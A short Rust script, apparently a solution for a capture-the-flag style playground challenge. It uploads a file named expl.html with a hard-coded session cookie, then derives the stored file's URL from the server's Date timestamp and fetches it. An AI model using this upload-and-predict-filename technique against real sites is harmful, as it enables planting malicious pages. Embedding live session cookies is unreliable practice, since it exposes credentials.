use std::time::UNIX_EPOCH;

use httpdate::parse_http_date;
use tokio::fs;
use reqwest::header::{COOKIE, DATE};

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    let backend_url = "https://glitchsnitch.playground.cyberhero.rs/api/upload";
    let file_path = "expl.html";

    let file_bytes = fs::read(file_path).await?;
    let part = reqwest::multipart::Part::bytes(file_bytes)
        .file_name("expl.html")
        .mime_str("text/html")?;

    let form = reqwest::multipart::Form::new().part("exploitFile", part);

    let client = reqwest::Client::new();
    let cookie_value = "connect.sid=s:h5uSHipqp4yelT_ncV0r0Hor5BX9_srm.6QMVgKS7D+IyZSfY3wDyISh26KoUn0/NoPyPULl1iKw";

    let res = client
        .post(backend_url)
        .header(COOKIE, cookie_value)
        .multipart(form)
        .send().await?;

    if res.status().is_success() {
        if let Some(date_header) = res.headers().get(DATE) {
            let date_str = date_header.to_str()?;
            let datetime = parse_http_date(date_str)?;
            let timestamp = datetime.duration_since(UNIX_EPOCH)?.as_secs();

            println!("Server time (Unix timestamp): {:?}", timestamp);

            let file_url = format!("https://glitchsnitch.playground.cyberhero.rs/_{timestamp}.html");

            println!("Exploit url: {}", file_url);
            let res = client
                .get(file_url)
                .header(COOKIE, cookie_value)
                .send().await?;

             if res.status().is_success() {
                let response = res.text().await?;
                println!("{response}");
             }
             else {
                 println!("Failed")
             }

        } else {
            println!("Date header not found in response");
        }
    } else {
        println!("Upload failed: {}", res.status());
    }
    println!("Hello, world!");

    Ok(())
}
